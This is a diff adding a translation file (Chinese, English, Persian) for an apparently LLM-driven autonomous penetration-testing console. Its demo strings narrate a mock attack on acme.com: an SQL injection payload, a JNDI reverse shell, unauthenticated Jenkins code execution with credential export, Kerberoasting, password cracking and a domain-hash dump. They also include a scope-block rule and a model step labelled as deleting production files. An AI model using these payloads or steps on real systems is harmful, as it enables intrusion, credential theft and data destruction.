+  "2 intents created → ids=[i6, i7]，已由 fa3 连入血缘": {
+    "en": "2 intents created → ids=[i6, i7], linked into the lineage by fa3",
+    "fa": "2 intents created → ids=[i6, i7]، توسط fa3 به تبار متصل شد"
+  },
+  "2 intents updated → ids=[i3, i5]（优先级升至 9，描述细化为『批量取数』）": {
+    "en": "2 intents updated → ids=[i3, i5] (priority raised to 9, description narrowed to “bulk data extraction”)",
+    "fa": "2 intents updated → ids=[i3, i5] (اولویت به 9 رسید و توضیح به «استخراج دسته‌ای داده» دقیق شد)"
+  },
+  "30天": {
+    "en": "30 days",
+    "fa": "30 روز"
+  },
+  "3月": {
+    "en": "3 months",
+    "fa": "3 ماه"
+  },
+  "4 intents created → ids=[i1, i2, i4, i5]，已连入 frontier": {
+    "en": "4 intents created → ids=[i1, i2, i4, i5], linked into the frontier",
+    "fa": "4 intents created → ids=[i1, i2, i4, i5]، به frontier متصل شد"
+  },
+  "429 Too Many Requests（已退避重试）": {
+    "en": "429 Too Many Requests (retried with backoff)",
+    "fa": "429 Too Many Requests (با عقب‌نشینی دوباره تلاش شد)"
+  },
+  "465 端口打开；587 保持关闭（会自动 STARTTLS）": {
+    "en": "Port 465 is open; 587 stays closed (STARTTLS is automatic)",
+    "fa": "درگاه 465 باز است؛ 587 بسته می‌ماند (STARTTLS خودکار انجام می‌شود)"
+  },
+  "5 个存活子域，其中 admin 是后台登录页。": {
+    "en": "5 live subdomains; admin is an admin login page.",
+    "fa": "5 زیردامنه فعال؛ admin صفحه ورود پنل مدیریت است."
+  },
+  "587 走 STARTTLS；465 请把「隐式 TLS」打开": {
+    "en": "587 uses STARTTLS; for 465, turn on “Implicit TLS”",
+    "fa": "587 از STARTTLS استفاده می‌کند؛ برای 465 «TLS ضمنی» را روشن کنید"
+  },
+  "6 子域 / 3 IP / 4 应用 / 4 端点": {
+    "en": "6 subdomains / 3 IPs / 4 apps / 4 endpoints",
+    "fa": "6 زیردامنه / 3 IP / 4 برنامه / 4 نقطه پایانی"
+  },
+  "6月": {
+    "en": "6 months",
+    "fa": "6 ماه"
+  },
+  "7天": {
+    "en": "7 days",
+    "fa": "7 روز"
+  },
+  "8 分钟破出口令 Sql@2020。": {
+    "en": "Password Sql@2020 cracked in 8 minutes.",
+    "fa": "گذرواژه Sql@2020 در 8 دقیقه شکسته شد."
+  },
+  "<!-- (demo) 抓到的响应体片段 -->\\n<html><body>MySQL error near ''1'='1'</body></html>\\n": {
+    "en": "<!-- (demo) captured response body snippet -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+    "fa": "<!-- (demo) قطعه ضبط‌شده از بدنه پاسخ -->\n<html><body>MySQL error near ''1'='1'</body></html>\n"
+  },
+  "<title>Acme Admin · 控制台": {
+    "en": "<title>Acme Admin · Console",
+    "fa": "<title>Acme Admin · کنسول"
+  },
+  "API 500 返回堆栈，泄露路径与框架版本": {
+    "en": "API 500 returns a stack trace and leaks paths and the framework version",
+    "fa": "API 500 رد پشته برمی‌گرداند و مسیرها و نسخه چارچوب را لو می‌دهد"
+  },
+  "API JWT 使用弱密钥、可离线爆破伪造": {
+    "en": "The API JWT uses a weak secret and can be forged by offline cracking",
+    "fa": "JWT این API کلید ضعیف دارد و با شکستن آفلاین قابل جعل است"
+  },
+  "API Key（X-API-Key，留空保留原值）": {
+    "en": "API Key (X-API-Key, leave empty to keep the current value)",
+    "fa": "API Key (X-API-Key، خالی بگذارید تا مقدار فعلی بماند)"
+  },
+  "API 地址": {
+    "en": "API address",
+    "fa": "نشانی API"
+  },
+  "API 越权专项": {
+    "en": "API authorization-bypass focus",
+    "fa": "تمرکز روی عبور از مجوز API"
+  },
+  "API 越权面梳理": {
+    "en": "API authorization-bypass surface",
+    "fa": "سطح عبور از مجوز API"
+  },
+  "ARTEX — 自主渗透测试控制台": {
+    "en": "ARTEX — Autonomous penetration testing console",
+    "fa": "ARTEX — کنسول آزمون نفوذ خودمختار"
+  },
+  "ARTEX 使用须知与免责声明": {
+    "en": "ARTEX terms of use and disclaimer",
+    "fa": "شرایط استفاده و سلب مسئولیت ARTEX"
+  },
+  "Acme Admin 登录": {
+    "en": "Acme Admin sign-in",
+    "fa": "ورود Acme Admin"
+  },
+  "Acme Corp — 企业官网": {
+    "en": "Acme Corp — Corporate website",
+    "fa": "Acme Corp — وب‌سایت سازمانی"
+  },
+  "Acme 官网": {
+    "en": "Acme website",
+    "fa": "وب‌سایت Acme"
+  },
+  "Acme 官网与后台外部渗透（acme.com）": {
+    "en": "External penetration test of the Acme website and admin panel (acme.com)",
+    "fa": "آزمون نفوذ خارجی وب‌سایت و پنل مدیریت Acme (acme.com)"
+  },
+  "Acme 首页": {
+    "en": "Acme homepage",
+    "fa": "صفحه اصلی Acme"
+  },
+  "Agent 发现": {
+    "en": "Discovered by Agent",
+    "fa": "کشف‌شده توسط Agent"
+  },
+  "Agent 正在回复，可输入 /btw 提问…": {
+    "en": "Agent is replying. You can ask with /btw…",
+    "fa": "Agent در حال پاسخ است. می‌توانید با /btw بپرسید…"
+  },
+  "Agent 正在运行": {
+    "en": "Agent is running",
+    "fa": "Agent در حال اجرا است"
+  },
+  "Agent 清单": {
+    "en": "Agent list",
+    "fa": "فهرست Agent"
+  },
+  "Base URL（可选）": {
+    "en": "Base URL (optional)",
+    "fa": "Base URL (اختیاری)"
+  },
+  "Brave（免费版 · 需 Key）": {
+    "en": "Brave (free tier · key required)",
+    "fa": "Brave (نسخه رایگان · نیازمند Key)"
+  },
+  "Brave（免费版）": {
+    "en": "Brave (free tier)",
+    "fa": "Brave (نسخه رایگان)"
+  },
+  "CIDR 格式无效，形如 192.168.0.0/16": {
+    "en": "Invalid CIDR format. Use a form like 192.168.0.0/16",
+    "fa": "قالب CIDR نامعتبر است. شکلی مانند 192.168.0.0/16"
+  },
+  "CIDR 网段，形如 192.168.0.0/16": {
+    "en": "CIDR range, for example 192.168.0.0/16",
+    "fa": "محدوده CIDR، برای مثال 192.168.0.0/16"
+  },
+  "Ctrl+Enter 发送，Enter 换行": {
+    "en": "Ctrl+Enter to send, Enter for a new line",
+    "fa": "Ctrl+Enter برای ارسال، Enter برای خط جدید"
+  },
+  "DC01 拿下了？给个总结。": {
+    "en": "Is DC01 owned? Give me a summary.",
+    "fa": "DC01 گرفته شد؟ یک جمع‌بندی بده."
+  },
+  "DMZ 主机双网卡直连内网，边界隔离失效": {
+    "en": "The DMZ host has dual NICs straight into the internal network, so boundary isolation has failed",
+    "fa": "میزبان DMZ با دو کارت شبکه مستقیم به شبکه داخلی وصل است و جداسازی مرز از کار افتاده"
+  },
+  "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root": {
+    "en": "sudo NOPASSWD misconfiguration on the DMZ foothold allows local privilege escalation to root",
+    "fa": "پیکربندی نادرست sudo NOPASSWD در نقطه اتکای DMZ ارتقای محلی به root را ممکن می‌کند"
+  },
+  "DMZ 立足点本地信息收集与提权至 root": {
+    "en": "Local enumeration and privilege escalation to root from the DMZ foothold",
+    "fa": "جمع‌آوری اطلاعات محلی و ارتقا به root از نقطه اتکای DMZ"
+  },
+  "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）": {
+    "en": "Local privilege escalation to root on the DMZ foothold (sudo NOPASSWD misconfiguration)",
+    "fa": "ارتقای محلی به root در نقطه اتکای DMZ (پیکربندی نادرست sudo NOPASSWD)"
+  },
+  "DNS 解析": {
+    "en": "DNS resolution",
+    "fa": "تبدیل DNS"
+  },
+  "DNS 解析类型 A/CNAME/MX/…": {
+    "en": "DNS record types A/CNAME/MX/…",
+    "fa": "انواع رکورد DNS شامل A/CNAME/MX/…"
+  },
+  "DSL 搜索：domain=example AND status_code>=400": {
+    "en": "DSL search: domain=example AND status_code>=400",
+    "fa": "جستجوی DSL: domain=example AND status_code>=400"
+  },
+  "DeepSeek 官方联网搜索": {
+    "en": "DeepSeek official web search",
+    "fa": "جستجوی وب رسمی DeepSeek"
+  },
+  "DeepSeek 服务端执行": {
+    "en": "DeepSeek server-side execution",
+    "fa": "اجرای سمت سرور DeepSeek"
+  },
+  "DeepSeek（官方）": {
+    "en": "DeepSeek (official)",
+    "fa": "DeepSeek (رسمی)"
+  },
+  "DuckDuckGo（ddgs · 免费无 Key）": {
+    "en": "DuckDuckGo (ddgs · free, no key)",
+    "fa": "DuckDuckGo (ddgs · رایگان، بدون Key)"
+  },
+  "Element-UI 后台，有 CSRF token 但无验证码。": {
+    "en": "Element-UI admin panel, with a CSRF token but no CAPTCHA.",
+    "fa": "پنل مدیریت Element-UI، با CSRF token اما بدون کپچا."
+  },
+  "Enter 发送，Shift+Enter 换行": {
+    "en": "Enter to send, Shift+Enter for a new line",
+    "fa": "Enter برای ارسال، Shift+Enter برای خط جدید"
+  },
+  "F-09「域控 DC01 完全控制 / secretsdump 导出全域哈希」critical（证据：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；上游链 fa9→fa10→i13 完整": {
+    "en": "F-09 “Full control of domain controller DC01 / secretsdump of all domain hashes” critical (evidence: psexec svc_deploy@10.10.10.10 + NTDS.dit dump); upstream chain fa9→fa10→i13 is complete",
+    "fa": "F-09 «کنترل کامل کنترل‌کننده دامنه DC01 / استخراج هش کل دامنه با secretsdump» critical (مدرک: psexec svc_deploy@10.10.10.10 + NTDS.dit dump)؛ زنجیره بالادستی fa9→fa10→i13 کامل است"
+  },
+  "FS01 [+] acme.local\\\\sa:Acme@2021 (Pwn3d!)\\nDC01 [-] 认证失败": {
+    "en": "FS01 [+] acme.local\\\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] Authentication failed",
+    "fa": "FS01 [+] acme.local\\\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] احراز هویت ناموفق بود"
+  },
+  "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。": {
+    "en": "Password reuse for sa succeeded on FS01 and that account is an administrator; DC01 did not accept it.",
+    "fa": "استفاده مجدد از گذرواژه sa روی FS01 موفق بود و آن حساب مدیر است؛ DC01 آن را نپذیرفت."
+  },
+  "FS01 已拿下，正在枚举共享目录寻找更多凭据和敏感文件……": {
+    "en": "FS01 is owned. Enumerating shares for more credentials and sensitive files…",
+    "fa": "FS01 گرفته شد. در حال شمارش پوشه‌های اشتراکی برای یافتن اعتبارنامه و فایل‌های حساس بیشتر…"
+  },
+  "Fastjson @type JNDI payload，触发回连。": {
+    "en": "Fastjson @type JNDI payload, which triggered a callback.",
+    "fa": "payload نوع JNDI با @type در Fastjson که اتصال برگشتی را فعال کرد."
+  },
+  "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。": {
+    "en": "GET /.git/HEAD → 200; git-dumper recovered the backend source and a commented database connection string.",
+    "fa": "GET /.git/HEAD → 200؛ git-dumper کد منبع بک‌اند و توضیح رشته اتصال پایگاه داده را بازیابی کرد."
+  },
+  "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\\\svc_deploy。": {
+    "en": "GET /script runs Groovy without signing in: 'whoami'.execute().text → SYSTEM; domain account acme\\\\svc_deploy was also exported from the credential store.",
+    "fa": "GET /script بدون ورود Groovy اجرا می‌کند: 'whoami'.execute().text → SYSTEM؛ و حساب دامنه acme\\\\svc_deploy هم از مخزن اعتبارنامه استخراج شد."
+  },
+  "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。": {
+    "en": "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL version error returned; the schema is readable.",
+    "fa": "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → خطای نسخه MSSQL برگشت؛ ساختار پایگاه قابل خواندن است."
+  },
+  "GET（不带请求体）": {
+    "en": "GET (no body)",
+    "fa": "GET (بدون بدنه)"
+  },
+  "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。": {
+    "en": "GetUserSPNs requested a TGS for svc_sql; hashcat -m 13100 cracked Sql@2020 offline. That account is in the SQL admins group.",
+    "fa": "GetUserSPNs برای svc_sql یک TGS درخواست کرد؛ hashcat -m 13100 گذرواژه Sql@2020 را آفلاین شکست. این حساب عضو گروه مدیران SQL است."
+  },
+  "Groovy 以 SYSTEM 权限执行。": {
+    "en": "Groovy executes as SYSTEM.",
+    "fa": "Groovy با دسترسی SYSTEM اجرا می‌شود."
+  },
+  "HS256 对称签名，若密钥弱可离线爆破伪造。": {
+    "en": "HS256 symmetric signature. A weak secret can be cracked offline and forged.",
+    "fa": "امضای متقارن HS256. اگر کلید ضعیف باشد می‌توان آن را آفلاین شکست و جعل کرد."
+  },
+  "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。": {
+    "en": "HS256, secret 'secret', cracked by john in 5 seconds → any sub can be forged to bypass authorization.",
+    "fa": "HS256، کلید 'secret'، john در 5 ثانیه شکست → می‌توان هر sub را جعل کرد و از مجوز عبور کرد."
+  },
+  "HTTP 200、finish_reason 是正常 stop，但整条响应一个内容块都没有——网关空帧、思考字段丢帧、采样打嗝都会长这样。": {
+    "en": "HTTP 200 and finish_reason is a normal stop, but the response has no content blocks. An empty gateway frame, a dropped thinking field, or a sampling hiccup all look like this.",
+    "fa": "HTTP 200 است و finish_reason یک stop عادی است، اما پاسخ هیچ بلوک محتوایی ندارد. فریم خالی دروازه، افتادن فیلد تفکر، یا اختلال نمونه‌برداری همگی این شکل را دارند."
+  },
+  "HTTP 报文代码": {
+    "en": "HTTP message code",
+    "fa": "کد پیام HTTP"
+  },
+  "HTTP 方法 GET/POST/PUT/…": {
+    "en": "HTTP method GET/POST/PUT/…",
+    "fa": "روش HTTP شامل GET/POST/PUT/…"
+  },
+  "HTTP 状态码（整数）": {
+    "en": "HTTP status code (integer)",
+    "fa": "کد وضعیت HTTP (عدد صحیح)"
+  },
+  "HTTP/1.1 200 OK\\nContent-Length: 12034\\n<html>… 搜索结果页 …</html>": {
+    "en": "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… search results page …</html>",
+    "fa": "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… صفحه نتایج جستجو …</html>"
+  },
+  "ICP 备案号": {
+    "en": "ICP filing number",
+    "fa": "شماره ثبت ICP"
+  },
+  "IDOR：/v1/orders?id= 可越权读他人订单": {
+    "en": "IDOR: /v1/orders?id= can read other people's orders",
+    "fa": "IDOR: /v1/orders?id= می‌تواند سفارش دیگران را بدون مجوز بخواند"
+  },
+  "IPv4 网段前缀需为 /16 至 /32": {
+    "en": "IPv4 prefix must be from /16 to /32",
+    "fa": "پیشوند محدوده IPv4 باید بین /16 و /32 باشد"
+  },
+  "IPv4/IPv6 地址": {
+    "en": "IPv4/IPv6 address",
+    "fa": "نشانی IPv4/IPv6"
+  },
+  "IPv6 网段前缀需为 /32 至 /128": {
+    "en": "IPv6 prefix must be from /32 to /128",
+    "fa": "پیشوند محدوده IPv6 باید بین /32 و /128 باشد"
+  },
+  "IP（全等）": {
+    "en": "IP (exact)",
+    "fa": "IP (تطابق کامل)"
+  },
+  "IP（模糊）": {
+    "en": "IP (fuzzy)",
+    "fa": "IP (مبهم)"
+  },
+  "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。": {
+    "en": "Jenkins on 8080 is directly reachable. First check whether the /script console requires authentication.",
+    "fa": "JENKINS روی 8080 مستقیم در دسترس است. ابتدا بررسی کنید کنسول /script احراز هویت می‌خواهد یا نه."
+  },
+  "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy": {
+    "en": "Jenkins console /script has no authentication and can run Groovy directly",
+    "fa": "کنسول /script در JENKINS احراز هویت ندارد و می‌تواند Groovy را مستقیم اجرا کند"
+  },
+  "Java 技术栈，存在 /api/import 接受 JSON body。": {
+    "en": "Java stack. /api/import accepts a JSON body.",
+    "fa": "پشته Java. رابط /api/import بدنه JSON می‌پذیرد."
+  },
+  "Jenkins (内部)": {
+    "en": "Jenkins (internal)",
+    "fa": "Jenkins (داخلی)"
+  },
+  "Jenkins Script Console 未授权可达。": {
+    "en": "Jenkins Script Console is reachable without authorization.",
+    "fa": "Jenkins Script Console بدون مجوز در دسترس است."
+  },
+  "Jenkins 未授权 RCE 确认，并导出两个域服务账号凭据。": {
+    "en": "Unauthenticated Jenkins RCE confirmed, and credentials for two domain service accounts were exported.",
+    "fa": "RCE بدون احراز هویت Jenkins تأیید شد و اعتبار دو حساب سرویس دامنه استخراج گردید."
+  },
+  "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020": {
+    "en": "Kerberoasted a TGS for svc_sql; hashcat cracked the password Sql@2020",
+    "fa": "TGS مربوط به svc_sql با Kerberoast گرفته شد و hashcat گذرواژه Sql@2020 را شکست"
+  },
+  "Kerberoasting 破出 svc_sql 口令，入图供域控攻击使用。": {
+    "en": "Kerberoasting cracked the svc_sql password and added it to the graph for the domain-controller attack.",
+    "fa": "Kerberoasting گذرواژه svc_sql را شکست و آن را برای حمله به کنترل‌کننده دامنه وارد گراف کرد."
+  },
+  "Kerberoasting 破解域服务账号 svc_sql 口令": {
+    "en": "Kerberoasting cracked the domain service account svc_sql password",
+    "fa": "Kerberoasting گذرواژه حساب سرویس دامنه svc_sql را شکست"
+  },
+  "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接": {
+    "en": "LDAP received the request → loaded ReverseShell → the nc listener got a connection",
+    "fa": "LDAP درخواست را دریافت کرد → ReverseShell بارگذاری شد → شنونده nc اتصال را گرفت"
+  },
+  "LLM 请求/响应记录": {
+    "en": "LLM request/response log",
+    "fa": "گزارش درخواست و پاسخ LLM"
+  },
+  "LLM 轮询开关": {
+    "en": "LLM polling toggle",
+    "fa": "کلید polling برای LLM"
+  },
+  "LLM 配置": {
+    "en": "LLM settings",
+    "fa": "پیکربندی LLM"
+  },
+  "LLM 配置不存在": {
+    "en": "LLM configuration does not exist",
+    "fa": "پیکربندی LLM وجود ندارد"
+  },
+  "LLM 配置已更新": {
+    "en": "LLM configuration updated",
+    "fa": "پیکربندی LLM به‌روزرسانی شد"
+  },
+  "LLM 配置已更新，并恢复 ${result.reopened_intents} 条额度阻塞意图": {
+    "en": "LLM configuration updated, and ${result.reopened_intents} quota-blocked intents were reopened",
+    "fa": "پیکربندی LLM به‌روزرسانی شد و ${result.reopened_intents} قصد مسدودشده به‌خاطر سهمیه دوباره باز شد"
+  },
+  "LLM 配置未设置 API Key": {
+    "en": "LLM configuration has no API Key",
+    "fa": "برای پیکربندی LLM هیچ API Key تنظیم نشده است"
+  },
+  "LLM 配置链": {
+    "en": "LLM configuration chain",
+    "fa": "زنجیره پیکربندی LLM"
+  },
+  "LLM 驱动的自主渗透测试系统控制台": {
+    "en": "Console for an LLM-driven autonomous penetration testing system",
+    "fa": "کنسول سامانه آزمون نفوذ خودمختار مبتنی بر LLM"
+  },
+  "MCP 地址": {
+    "en": "MCP address",
+    "fa": "نشانی MCP"
+  },
+  "MSSQL 报错型注入迹象。": {
+    "en": "Signs of MSSQL error-based injection.",
+    "fa": "نشانه‌های تزریق مبتنی بر خطا در MSSQL."
+  },
+  "PATCH（带请求体）": {
+    "en": "PATCH (with body)",
+    "fa": "PATCH (با بدنه)"
+  },
+  "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。": {
+    "en": "POST /api/import submitted a JNDI payload (@type:JdbcRowSetImpl) → callback to dnslog and a reverse shell landed (www-data@dmz-web01).",
+    "fa": "POST /api/import یک payload از نوع JNDI (@type:JdbcRowSetImpl) فرستاد → بازگشت به dnslog و reverse shell برقرار شد (www-data@dmz-web01)."
+  },
+  "POST（带请求体）": {
+    "en": "POST (with body)",
+    "fa": "POST (با بدنه)"
+  },
+  "PUT（带请求体）": {
+    "en": "PUT (with body)",
+    "fa": "PUT (با بدنه)"
+  },
+  "Python 正文（参数走 stdin JSON / os.environ[\"TOOL_X\"]）": {
+    "en": "Python body (parameters via stdin JSON / os.environ[\"TOOL_X\"])",
+    "fa": "متن Python (پارامترها از راه stdin JSON / os.environ[\"TOOL_X\"])"
+  },
+  "SDK · 仅 openai 格式": {
+    "en": "SDK · openai format only",
+    "fa": "SDK · فقط قالب openai"
+  },
+  "SDK · 拿到 200 之前": {
+    "en": "SDK · before a 200 is received",
+    "fa": "SDK · پیش از دریافت 200"
+  },
+  "SMTP 服务器": {
+    "en": "SMTP server",
+    "fa": "سرور SMTP"
+  },
+  "SQL 注入确认。": {
+    "en": "SQL injection confirmed.",
+    "fa": "تزریق SQL تأیید شد."
+  },
+  "SQL 注入（search q）可读 acme_prod 库": {
+    "en": "SQL injection (search q) can read the acme_prod database",
+    "fa": "تزریق SQL (search q) می‌تواند پایگاه acme_prod را بخواند"
+  },
+  "SQL注入\\n命令执行": {
+    "en": "SQL injection\nCommand execution",
+    "fa": "تزریق SQL\nاجرای فرمان"
+  },
+  "Script Console 无需登录即可访问。": {
+    "en": "Script Console is accessible without signing in.",
+    "fa": "Script Console بدون ورود در دسترس است."
+  },
+  "Shodan 搜索": {
+    "en": "Shodan search",
+    "fa": "جستجوی Shodan"
+  },
+  "Skill 总数": {
+    "en": "Skill count",
+    "fa": "تعداد Skill"
+  },
+  "Successfully wrote reports/summary.md\\n共写入 68 个字符。": {
+    "en": "Successfully wrote reports/summary.md\nWrote 68 characters.",
+    "fa": "Successfully wrote reports/summary.md\n68 نویسه نوشته شد."
+  },
+  "Tavily（需 Key）": {
+    "en": "Tavily (key required)",
+    "fa": "Tavily (نیازمند Key)"
+  },
+  "URL / 正文关键词": {
+    "en": "URL / body keywords",
+    "fa": "URL / کلیدواژه‌های متن"
+  },
+  "URL（全等）": {
+    "en": "URL (exact)",
+    "fa": "URL (تطابق کامل)"
+  },
+  "URL（模糊）": {
+    "en": "URL (fuzzy)",
+    "fa": "URL (مبهم)"
+  },
+  "Worker #${session.intent_id} 及其独占下游已彻底删除${extra}": {
+    "en": "Worker #${session.intent_id} and its exclusive downstream were permanently deleted${extra}",
+    "fa": "Worker #${session.intent_id} و پایین‌دست انحصاری آن برای همیشه حذف شد${extra}"
+  },
+  "Worker #${session.intent_id} 已删除（原因已记录，规划者将据此重新规划）": {
+    "en": "Worker #${session.intent_id} deleted (reason recorded; the planner will replan from it)",
+    "fa": "Worker #${session.intent_id} حذف شد (دلیل ثبت شد؛ برنامه‌ریز بر اساس آن دوباره برنامه‌ریزی می‌کند)"
+  },
+  "Worker #${session.intent_id} 已恢复，等待重新领取": {
+    "en": "Worker #${session.intent_id} resumed and is waiting to be claimed again",
+    "fa": "Worker #${session.intent_id} از سر گرفته شد و منتظر دریافت دوباره است"
+  },
+  "Worker #${session.intent_id} 已暂停": {
+    "en": "Worker #${session.intent_id} paused",
+    "fa": "Worker #${session.intent_id} متوقف شد"
+  },
+  "Worker 意图（旧版）": {
+    "en": "Worker intents (legacy)",
+    "fa": "قصدهای Worker (نسخه قدیمی)"
+  },
+  "Worker 执行会话": {
+    "en": "Worker execution session",
+    "fa": "نشست اجرای Worker"
+  },
+  "Worker 操作失败：${(error as Error).message}": {
+    "en": "Worker action failed: ${(error as Error).message}",
+    "fa": "عملیات Worker ناموفق بود: ${(error as Error).message}"
+  },
+  "[模型] 删除目标生产文件(D4)": {
+    "en": "[Model] Delete the target production files (D4)",
+    "fa": "[مدل] حذف فایل‌های تولید هدف (D4)"
+  },
+  "[模型] 疑似备份表,无法确定是否生产数据": {
+    "en": "[Model] Looks like a backup table, cannot tell whether it is production data",
+    "fa": "[مدل] شبیه جدول پشتیبان است و نمی‌توان تشخیص داد داده تولید است یا نه"
+  },
+  "[模型] 疑似备份表，无法确定是否生产数据。": {
+    "en": "[Model] Looks like a backup table; cannot tell whether it is production data.",
+    "fa": "[مدل] شبیه جدول پشتیبان است؛ نمی‌توان تشخیص داد داده تولید است یا نه."
+  },
+  "[高] SQL 注入 www.acme.com/search?q=": {
+    "en": "[High] SQL injection www.acme.com/search?q=",
+    "fa": "[بالا] تزریق SQL در www.acme.com/search?q="
+  },
+  "\\n注意：容器内更新只替换程序本身，不会更新镜像里的 playwright / nmap 等工具链；": {
+    "en": "Note: An in-container update only replaces the application itself. It does not update toolchains baked into the image, such as playwright / nmap;",
+    "fa": "توجه: به‌روزرسانی داخل کانتینر فقط خود برنامه را عوض می‌کند و زنجیره ابزار داخل تصویر، مانند playwright / nmap، را به‌روز نمی‌کند؛"
+  },
+  "acme 后台切入点讨论": {
+    "en": "Discussion of the Acme admin entry point",
+    "fa": "بحث درباره نقطه ورود پنل Acme"
+  },
+  "acme.com → 302 → www；Server: nginx/1.24.0\\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征": {
+    "en": "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By absent, body matches element-ui/vue fingerprints",
+    "fa": "acme.com → 302 → www؛ Server: nginx/1.24.0\nadmin.acme.com → 200، X-Powered-By وجود ندارد و بدنه با نشانه‌های element-ui/vue جور است"
+  },
+  "acme.com 子域枚举与端口扫描": {
+    "en": "acme.com subdomain enumeration and port scan",
+    "fa": "شمارش زیردامنه‌ها و پویش درگاه acme.com"
+  },
+  "add_intent × 2（Fastjson 突破链，串行分步先派可执行一步）": {
+    "en": "add_intent × 2 (Fastjson break-in chain; serial steps, dispatch only the next executable step)",
+    "fa": "add_intent × 2 (زنجیره نفوذ Fastjson؛ گام‌های سری، ابتدا فقط گام قابل اجرا فرستاده شود)"
+  },
+  "add_intent × 2（收敛 g2 取数，提高优先级）": {
+    "en": "add_intent × 2 (close out g2 data extraction and raise priority)",
+    "fa": "add_intent × 2 (جمع‌بندی استخراج داده g2 و بالا بردن اولویت)"
+  },
+  "add_intent × 4（以立足点为 pivot 展开内网横向）": {
+    "en": "add_intent × 4 (pivot from the foothold into internal lateral movement)",
+    "fa": "add_intent × 4 (با نقطه اتکا به‌عنوان pivot، حرکت جانبی در شبکه داخلی)"
+  },
+  "add_intent × 4（批量派首批探索方向）": {
+    "en": "add_intent × 4 (dispatch the first batch of exploration directions)",
+    "fa": "add_intent × 4 (اعزام دسته‌ای اولین جهت‌های اکتشاف)"
+  },
+  "add_intent 前先看 worker 到底还原出什么，避免凭指纹臆测方向。": {
+    "en": "Before add_intent, see what the worker actually recovered so the direction is not guessed from a fingerprint.",
+    "fa": "پیش از add_intent ببینید worker دقیقاً چه چیزی را بازیابی کرده تا جهت کار از روی اثر انگشت حدس زده نشود."
+  },
+  "admin 后台默认口令 / 弱口令测试": {
+    "en": "Default and weak password test for the admin panel",
+    "fa": "آزمون گذرواژه پیش‌فرض و ضعیف برای پنل admin"
+  },
+  "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。": {
+    "en": "admin is a standalone admin login page. Five entry points checked out, so the initial intent can be written precisely.",
+    "fa": "admin یک صفحه ورود مستقل برای پنل است. پنج ورودی معتبر تأیید شد، پس می‌توان توضیح قصد اولیه را دقیق نوشت."
+  },
+  "admin.acme.com 后台默认口令 admin/admin123": {
+    "en": "Default admin credentials admin/admin123 on admin.acme.com",
+    "fa": "گذرواژه پیش‌فرض پنل admin.acme.com برابر admin/admin123 است"
+  },
+  "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。": {
+    "en": "admin.acme.com is an Element-UI admin panel with no CAPTCHA and no rate limit. Try the default-password list (admin/admin123) before a wordlist. I injected a high-priority intent for the work agent.",
+    "fa": "admin.acme.com یک پنل Element-UI است، بدون کپچا و بدون محدودیت نرخ. ابتدا فهرست گذرواژه پیش‌فرض (admin/admin123) را امتحان کنید و بعد واژه‌نامه را. یک قصد با اولویت بالا به work agent تزریق کردم."
+  },
+  "admin/admin 失败。": {
+    "en": "admin/admin failed.",
+    "fa": "admin/admin ناموفق بود."
+  },
+  "admin/admin123 登录成功，拿到会话 cookie。": {
+    "en": "admin/admin123 signed in and obtained a session cookie.",
+    "fa": "ورود با admin/admin123 موفق بود و کوکی نشست گرفته شد."
+  },
+  "agent 循环轮次（模型调用次数）": {
+    "en": "Agent loop turns (model call count)",
+    "fa": "دورهای حلقه Agent (تعداد فراخوانی مدل)"
+  },
+  "api.acme.com 订单接口越权(IDOR)测试": {
+    "en": "api.acme.com order API authorization-bypass (IDOR) test",
+    "fa": "آزمون عبور از مجوز (IDOR) برای رابط سفارش api.acme.com"
+  },
+  "api.acme.com/v1/orders?id= 可越权读取他人订单": {
+    "en": "api.acme.com/v1/orders?id= can read other people's orders without authorization",
+    "fa": "api.acme.com/v1/orders?id= می‌تواند سفارش دیگران را بدون مجوز بخواند"
+  },
+  "block bash: 目标越界 out.evil.example 不在 scope 内": {
+    "en": "block bash: target out.evil.example is outside the boundary and not in scope",
+    "fa": "block bash: هدف out.evil.example خارج از مرز است و در scope نیست"
+  },
+  "claim 意图 → 跑 Kali 工具 → 图写回": {
+    "en": "claim intent → run Kali tools → write back to the graph",
+    "fa": "claim قصد → اجرای ابزارهای Kali → بازنویسی در گراف"
+  },
+  "command（shell 命令模板）": {
+    "en": "command (shell command template)",
+    "fa": "command (قالب فرمان shell)"
+  },
+  "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库": {
+    "en": "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # export the Jenkins credential store",
+    "fa": "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # استخراج مخزن اعتبارنامه Jenkins"
+  },
+  "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"对 search?q= 做注入探测。\"}}": {
